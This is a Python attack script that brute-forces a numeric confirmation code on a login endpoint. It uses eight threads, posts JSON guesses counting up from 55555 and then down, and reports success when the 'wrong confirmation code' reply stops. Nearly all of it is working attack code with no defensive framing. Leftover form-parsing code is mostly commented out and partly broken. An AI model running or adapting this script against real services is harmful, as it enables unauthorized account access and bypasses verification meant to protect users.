from  html.parser import HTMLParser
import urllib.request
import urllib.parse
import http.cookiejar
import queue
import threading
import sys
import os
import requests
import json
import time
from django.core.serializers import json

threads = 8
resume_word = None
username = "admin"
headers = {
    "content-type": "application/json"
}
#this is a JSON file that posted to url
data = {"first_name":"MyName","last_name":"MyLastName","email":"a@a.com","phone":"091****4141","password":"11111111","code":"4545"}
# target_url = "http://10.0.0.3:9001/login/"
#this is targer url for brute force
post_url = "https://example.com/login"

# username_field = "username"
# password_field = "password"

#Takes a word file and builds a word queue object. You can resume a word in the file
#by modifying the resume_word value in the script
def build_passwd_q(passwd_file):
    fd = open("./passfile.txt", "rb")
    passwd_list = fd.readlines()
    fd.close()

    passwd_q = queue.Queue()

    if len(passwd_list):
        if not resume_word:
            for passwd in passwd_list:
                passwd = passwd.decode("utf-8").rstrip()
                # print("pass------->>>>>"+passwd)
                passwd_q.put(passwd)
        else:
            resume_found = False
            for passwd in passwd_list:
                passwd = passwd.decode("utf-8").rstrip()
                if passwd == resume_word:
                    resume_found = True
                    passwd_q.put(passwd)
                else:
                    if resume_found:
                        passwd_q.put(passwd)
        return passwd_q

#An instance of this class, would perform the following:
#1- Pull out a password from the queue
#2- Retrieve the login HTML page
#3- Parse the resulting HTML looking for username and password fields
#as part of the input form
#4- Performs a POST on the login page with the username and the retrieved password
#5- Retrieve the resulting HTML page. If the page does not have the login form,
#we assume Brute-Force is successful. Otherwise, repeat the whole process with
#the next password in the queue
class BruteForcer():
    def __init__(self, username, passwd_q):
        self.username = username
        self.passwd_q = passwd_q
        self.found = False

    def html_brute_forcer(self, count):
        # while not passwd_q.empty() and not self.found:
        ii = 55555
        while ii < 99999 and not self.found:
            # print("hey")
            #Enable cookies for the session
            # cookiejar = http.cookiejar.FileCookieJar("cookies")
            # opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookiejar))

            #This allows urlopen to use cookiejar
            # urllib.request.install_opener(opener)

            # request = urllib.request.Request(target_url, headers=headers)
            # response = urllib.request.urlopen(request)

            #The response is in bytes. Convert to string and remove b''
            # page = str(response.read())[2:-1]


            #Parse HTML Form
            # parsed_html = BruteParser()
            # parsed_html.feed(page)

            # if username_field in parsed_html.parsed_results.keys() and password_field in parsed_html.parsed_results.keys():
            #     parsed_html.parsed_results[username_field] = self.username
            #     parsed_html.parsed_results[password_field] = self.passwd_q.get()

                # print("[*] Attempting {}/{}".format(self.username,parsed_html.parsed_results[password_field]))

                #Must be bytes
                # post_data = urllib.parse.urlencode(parsed_html.parsed_results).encode()
            # headers["code"] = self.passwd_q.get()
            data["code"] = str(ii)

            #---------------------------
            res = requests.post(post_url,headers=headers,json=data)
            resJ = res.json()
            # if resJ["description"] == "wrong confirmation code":
            #     print("vaaaaaay")
            # print(res.status)
            # print(res.reason)

            # brute_force_request = urllib.request.Request(post_url, body=headers)
            # brute_force_response = urllib.request.urlopen(brute_force_request)

            #The response is in bytes. Convert to string and remove b''
            # brute_force_page = str(brute_force_response.read())[2:-1]
            # print("response------>"+brute_force_response)
            #Parse HTML Form
            # brute_force_parsed_html = BruteParser()
            # brute_force_parsed_html.feed(brute_force_page)


            if not resJ.get("description") == "wrong confirmation code":
                    self.found= True
                    print("[*] Brute-Force Attempt is Successful!")
                    print("[*] Username: {}".format(self.username))
                    print("[*] Password: {}".format(ii))
                    print("[*] Done")
                    os._exit(0)
            else:
                print("[!thread count {}]".format(count)+resJ.get("description") +"for "+ str(ii))
                time.sleep(.4)
                ii+=count

        ii = 55554
        while ii > 10000:

                # Enable cookies for the session
                # cookiejar = http.cookiejar.FileCookieJar("cookies")
                # opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookiejar))

                # This allows urlopen to use cookiejar
                # urllib.request.install_opener(opener)

                # request = urllib.request.Request(target_url, headers=headers)
                # response = urllib.request.urlopen(request)

                # The response is in bytes. Convert to string and remove b''
                # page = str(response.read())[2:-1]

                # Parse HTML Form
                # parsed_html = BruteParser()
                # parsed_html.feed(page)

                # if username_field in parsed_html.parsed_results.keys() and password_field in parsed_html.parsed_results.keys():
                #     parsed_html.parsed_results[username_field] = self.username
                #     parsed_html.parsed_results[password_field] = self.passwd_q.get()

                # print("[*] Attempting {}/{}".format(self.username,parsed_html.parsed_results[password_field]))

                # Must be bytes
                # post_data = urllib.parse.urlencode(parsed_html.parsed_results).encode()
                # headers["code"] = self.passwd_q.get()
                data["code"] = str(ii)

                # ---------------------------
                res = requests.post(post_url, headers=headers, json=data)
                resJ = res.json()
                # if resJ["description"] == "wrong confirmation code":
                #     print("vaaaaaay")
                # print(res.status)
                # print(res.reason)

                # brute_force_request = urllib.request.Request(post_url, body=headers)
                # brute_force_response = urllib.request.urlopen(brute_force_request)

                # The response is in bytes. Convert to string and remove b''
                # brute_force_page = str(brute_force_response.read())[2:-1]
                # print("response------>"+brute_force_response)
                # Parse HTML Form
                # brute_force_parsed_html = BruteParser()
                # brute_force_parsed_html.feed(brute_force_page)

                if not resJ.get("description") == "wrong confirmation code":
                    self.found = True
                    print("[*] Brute-Force Attempt is Successful!")
                    print("[*] Username: {}".format(self.username))
                    print("[*] Password: {}".format(ii))
                    print("[*] Done")
                    os._exit(0)
                else:
                    print("[!thread count {}]".format(count) + resJ.get("description") + " for " + str(ii))
                    time.sleep(.4)
                    ii -= count



    #Brute-Forcing with multiple threads
    def html_brute_forcer_thread_starter(self):
        print("[*] Brute-Forcing with {} threads".format(threads))
        for i in range(threads):
            print(i+1)
            html_brute_forcer_thread = threading.Thread(target=self.html_brute_forcer,args=(i+1,))
            html_brute_forcer_thread.start()


#An instance of this class allows for parsing the HTML page looking for username
#and password fields as part of the input form. self.parsed_results should contain
#username and password keys
class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.parsed_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            for name, value in attrs:
                if name == "name" and value == username_field:
                    self.parsed_results[username_field] = username_field
                if name == "name" and value == password_field:
                    self.parsed_results[password_field] = password_field


print("[*] Started HTML Form Brute-Forcer Script")
print("[*] Building Password Queue")
passwd_q = build_passwd_q("passwd.txt")
if passwd_q.qsize():
    print("[*] Password Queue Build Successful")
    attempt_brute_force = BruteForcer("admin", passwd_q)
    attempt_brute_force.html_brute_forcer_thread_starter()
else:
    print("[!] Empty Password File!")
    sys.exit(0)
